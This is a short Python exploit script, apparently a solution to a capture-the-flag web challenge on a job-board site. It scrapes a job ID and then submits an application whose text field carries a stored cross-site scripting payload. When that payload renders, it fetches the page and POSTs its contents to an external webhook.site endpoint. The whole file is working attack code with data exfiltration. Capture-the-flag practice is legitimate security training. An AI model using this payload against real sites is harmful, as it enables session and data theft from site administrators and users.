import requests
import os
from bs4 import BeautifulSoup

base = "https://job-board.chall.lac.tf"
url = lambda end: f"{base.rstrip('/')}{end}"

s = requests.Session()

r = s.get(url("/"))
soup = BeautifulSoup(r.text, "html.parser")
job_list = soup.select("li>a[href]")
job_id = job_list[0]["href"].split("/")[-1]

payload = """
<>&'"

<script>
const webhook = 'https://webhook.site/a5859d7e-c34a-458c-936e-1e37d7e7f5c3';
fetch('/').then(r => r.text()).then(r => fetch(
  webhook, {
    method: 'POST',
    body: r
  }
))
</script>
"""

r = s.post(url(f"/application/{job_id}"), data={
    "name": "r2uwu2",
    "email": "r2@uwu.com",
    "why": payload
})
print(r.text)
